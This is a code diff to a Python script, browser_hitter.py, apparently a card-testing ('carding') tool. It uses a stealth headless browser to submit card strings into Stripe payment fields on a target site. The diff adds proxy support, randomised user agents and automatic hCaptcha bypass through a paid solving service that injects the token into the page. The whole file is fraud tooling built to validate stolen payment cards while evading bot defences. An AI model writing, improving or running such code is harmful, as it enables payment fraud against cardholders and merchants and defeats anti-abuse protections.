@@ -1,8 +1,14 @@
 import asyncio
 import random
 import sys
+import os
+import httpx
 from playwright.async_api import async_playwright
 from playwright_stealth import stealth_async
+from dotenv import load_dotenv
+
+load_dotenv()
+AZAPI_KEY = os.getenv("AZAPI_KEY")
 
 # User Agents for randomization
 USER_AGENTS = [
@@ -13,7 +19,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
 ]
 
-async def hit_card(url, card_str):
+async def hit_card(url, card_str, proxy=None):
     if '|' not in card_str:
         print(f"ERROR: Invalid card format {card_str}")
         return
@@ -26,7 +32,14 @@ async def hit_card(url, card_str):
         
         # Random User Agent for this session
         ua = random.choice(USER_AGENTS)
-        context = await browser.new_context(user_agent=ua)
+        
+        context_args = {"user_agent": ua}
+        if proxy:
+            # Handle socks5://user:pass@host:port or http://user:pass@host:port
+            print(f"🌐 Using Proxy: {proxy}")
+            context_args["proxy"] = {"server": proxy}
+            
+        context = await browser.new_context(**context_args)
         
         page = await context.new_page()
         await stealth_async(page)
@@ -35,6 +48,43 @@ async def hit_card(url, card_str):
         try:
             await page.goto(url, wait_until="networkidle", timeout=60000)
             
+            # --- hCaptcha Check ---
+            print("🔍 Checking for hCaptcha...")
+            hcaptcha_iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
+            if hcaptcha_iframe:
+                print("🧩 hCaptcha detected! Attempting to solve with Azapi...")
+                # Extract sitekey
+                src = await hcaptcha_iframe.get_attribute("src")
+                sitekey = None
+                if "sitekey=" in src:
+                    sitekey = src.split("sitekey=")[1].split("&")[0]
+                
+                if sitekey and AZAPI_KEY:
+                    print(f"🔑 Sitekey: {sitekey}")
+                    async with httpx.AsyncClient() as client:
+                        resp = await client.post(
+                            "https://api.azapi.ai/h0001c",
+                            headers={"Authorization": AZAPI_KEY},
+                            json={"sitekey": sitekey, "pageurl": url},
+                            timeout=60.0
+                        )
+                        result = resp.json()
+                        if result.get("success") and result.get("data", {}).get("solution"):
+                            token = result["data"]["solution"]
+                            print("✅ hCaptcha Solved! Injecting token...")
+                            await page.evaluate(f"""
+                                document.getElementsByName('h-captcha-response').forEach(el => el.innerHTML = '{token}');
+                                document.getElementsByName('g-recaptcha-response').forEach(el => el.innerHTML = '{token}');
+                                if (window.hcaptcha) {{
+                                    window.hcaptcha.execute(); 
+                                }}
+                            """)
+                            await asyncio.sleep(2)
+                        else:
+                            print(f"❌ Azapi Failed: {result.get('message', 'Unknown error')}")
+                else:
+                    print("⚠️ Could not find sitekey or AZAPI_KEY missing.")
+
             # Find Stripe Iframes
             print("⏳ Waiting for Stripe fields...")
             await page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=30000)
@@ -100,8 +150,9 @@ async def hit_card(url, card_str):
 
 if __name__ == "__main__":
     if len(sys.argv) < 3:
-        print("Usage: python browser_hitter.py <url> <card>")
+        print("Usage: python browser_hitter.py <url> <card> [proxy]")
     else:
         target_url = sys.argv[1]
         card_data = sys.argv[2]
-        asyncio.run(hit_card(target_url, card_data))
+        proxy_url = sys.argv[3] if len(sys.argv) > 3 else None
+        asyncio.run(hit_card(target_url, card_data, proxy_url))
